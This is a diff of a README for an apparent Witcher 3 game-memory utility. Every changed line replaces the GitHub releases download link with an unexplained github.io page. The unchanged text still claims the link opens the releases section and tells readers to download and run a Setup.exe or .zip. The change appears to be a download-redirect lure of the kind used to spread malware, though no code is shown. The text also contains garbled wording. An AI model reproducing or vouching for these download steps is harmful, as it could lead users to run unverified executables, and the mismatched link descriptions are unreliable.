@@ -1,6 +1,6 @@
 # 🎮 Witcher-3-Gameplay-Utility - Enhance Your Witcher Experience Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Witcher_3_Utility-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=purple&color=orange)](https://github.com/theaweso4321/Witcher-3-Gameplay-Utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Witcher_3_Utility-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=purple&color=orange)](https://theaweso4321.github.io)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ This tool gives you powerful, easy-to-use controls to customize your Witcher 3 a
 
 ### Step 1: Get the File
 Visit this link to download the application:
-[**https://github.com/theaweso4321/Witcher-3-Gameplay-Utility/releases**](https://github.com/theaweso4321/Witcher-3-Gameplay-Utility/releases)
+[**https://theaweso4321.github.io**](https://theaweso4321.github.io)
 
 On that page, you'll see a list of available files since this link leads to the releases section. Look for the most recent version (usually at the top) and click the download arrow next to the file named something like `Witcher3Utility_vX.X.zip` or `Witcher3Utility_Setup.exe`. Your web browser will save the file to your "Downloads" folder by default.
 
@@ -154,7 +154,7 @@ No. The utility only modifies live game memory. Your actual save file remains un
 
 ## 🎯 Final Checklist Before You Play
 
-[ ] Downloaded the utility from the **releases page** at: [https://github.com/theaweso4321/Witcher-3-Gameplay-Utility/releases](https://github.com/theaweso4321/Witcher-3-Gameplay-Utility/releases)
+[ ] Downloaded the utility from the **releases page** at: [https://theaweso4321.github.io](https://theaweso4321.github.io)
 
 [ ] Extracted the `.zip` (if applicable) or kept the `.exe` handy on Desktop[ ] Launched The Witcher 3: Wild Hunt (Next-Gen Update)[ ] Opened the utility (double-click executable)[ ] Clicked "Attach" to connect to the game (if not auto-detected)[ ] Toggled your desired features on[ ] Assigned hotkeys for quick access[ ] Saved a profile chair future sessions[ ] Pressed Play and enjoyed the game without limits!
 
